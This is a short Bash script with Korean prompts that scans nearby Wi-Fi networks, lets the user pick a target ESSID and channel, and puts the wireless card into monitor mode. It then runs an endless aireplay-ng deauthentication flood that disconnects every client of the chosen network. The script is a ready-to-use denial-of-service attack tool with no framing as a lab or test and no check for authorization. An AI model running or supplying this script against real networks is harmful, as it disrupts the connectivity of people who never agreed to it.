show_wireless_interfaces() {
    sudo echo "사용 가능한 무선 네트워크 인터페이스 목록:"
    iwconfig | grep "IEEE 802.11" | awk '{print $1}'
}

scan_and_select_network() {
    echo "무선 네트워크 목록:"
    sudo iwlist $INTERFACE scan | grep "ESSID\|Channel"
    read -p "무선 네트워크의 ESSID를 입력하세요: " SELECTED_ESSID
    read -p "무선 네트워크의 Channel을 입력하세요: " SELECTED_CHANNEL
}

start_monitor_mode() {
    sudo airmon-ng start $INTERFACE
    MON_INTERFACE="${INTERFACE}mon"
}

deauthenticate() {
    sudo iwconfig $MON_INTERFACE channel $SELECTED_CHANNEL
    sudo aireplay-ng --deauth 0 -e "$SELECTED_ESSID" $MON_INTERFACE
}

stop_monitor_mode() {
    sudo airmon-ng stop $MON_INTERFACE
}

show_wireless_interfaces
read -p "사용할 무선 네트워크 인터페이스를 선택하세요: " INTERFACE

echo "주변 무선 네트워크를 스캔합니다..."
scan_and_select_network
start_monitor_mode
deauthenticate
stop_monitor_mode
